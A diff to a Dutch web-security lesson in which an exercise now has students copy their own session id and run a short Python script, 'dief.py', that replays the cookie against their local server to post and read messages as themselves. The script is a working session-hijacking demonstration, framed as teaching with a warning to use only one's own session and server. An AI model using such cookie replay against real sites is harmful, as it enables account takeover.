@@ -88,32 +88,38 @@ en log daar opnieuw in.
 
 ## Opdrachten
 
-### Opdracht 1: Investigate - Wat stuurt de server mee?
+### Opdracht 1: Investigate - Wat kan iemand met het getal?
 
-Open het tabblad **Netwerk**, log nog een keer in, en klik op het verzoek
-`inloggen`. Zoek bij Headers, onder **Reactieheaders**, de regel `set-cookie`. Welke instellingen
-zie je achter het sessie-id staan?
+Kopieer je sessie-id uit de Console, zonder `sessie_id=` en de aanhalingstekens.
+Maak `dief.py` en zet het getal bij `gestolen`:
 
-<details>
-<summary>Tip</summary>
+```python
+import httpx
 
-De instellingen staan achter de waarde, gescheiden door puntkomma's.
+gestolen = "bb4b18ca1efc4877c990fdadd8a6f593"
+dief = httpx.Client(base_url="http://127.0.0.1:8000", cookies={"sessie_id": gestolen})
+print(dief.post("/bericht", data={"bericht": "Dit schreef ik niet"}).json())
 
-</details>
+for bericht in dief.get("/berichten").json().values():
+    print(bericht)
+```
+
+Met `cookies=` krijgt een `Client` een cookie mee, alsof hij die al had. Draai
+het script. Op wiens naam staat het nieuwe bericht?
 
 <details>
 <summary>Antwoord</summary>
 
-Iets als:
+Op jouw naam. Het script print eerst `{'sleutel': 'bericht_…'}`, en in de lijst
+staat een regel als:
 
 ```
-sessie_id=bb4b18ca1efc4877c990fdadd8a6f593; Max-Age=2592000; Path=/; SameSite=lax
+{'naam': 'sara', 'bericht': 'Dit schreef ik niet'}
 ```
 
-`Max-Age` is de 30 dagen uit `max_age` in
-seconden, `Path=/` betekent: voor de hele site. `SameSite=lax` zet FastAPI er
-vanzelf bij; wat dat doet, staat in [les 4: `samesite`](site:fullstack/docs/veiligheid/cookies/samesite). `HttpOnly`
-staat er niet bij, en daarom mag een script de cookie lezen.
+Het script kende geen naam en geen wachtwoord, alleen het getal. Voor je server
+is dat genoeg: hij zoekt het sessie-id op in `sessies.db`, en vindt daar jouw
+naam. Doe dit alleen met je eigen sessie-id, op je eigen server.
 
 </details>
 
